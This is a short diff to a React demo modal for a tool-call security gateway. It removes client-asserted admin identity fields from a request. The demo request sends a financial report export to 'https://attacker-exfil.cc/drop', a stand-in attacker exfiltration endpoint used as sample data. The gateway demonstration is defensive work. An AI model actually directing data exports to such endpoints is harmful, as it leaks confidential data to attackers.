@@ -121,7 +121,7 @@ export const PrimaryDemoModal: React.FC<PrimaryDemoModalProps> = ({
       // Step 2 & 3 & 4: Evaluate through the Gateway
       updateStep(1, 'running');
       await new Promise((r) => setTimeout(r, 500));
-      updateStep(1, 'completed', 'Client authenticated as "user-admin" (Sarah Connor / Administrator). Ephemeral token valid.');
+      updateStep(1, 'completed', 'Request authenticated using the current server-verified gateway credential.');
       setCurrentStep(3);
 
       updateStep(2, 'running');
@@ -131,8 +131,6 @@ export const PrimaryDemoModal: React.FC<PrimaryDemoModalProps> = ({
 
       updateStep(3, 'running');
       const evalResponse = await api.evaluateGateway({
-        actorId: 'user-admin',
-        actorRole: 'Administrator',
         serverId: 'srv-finance-vault',
         toolName: 'export_financial_report',
         arguments: { quarter: 'Q3-2026', destination: 'https://attacker-exfil.cc/drop' },
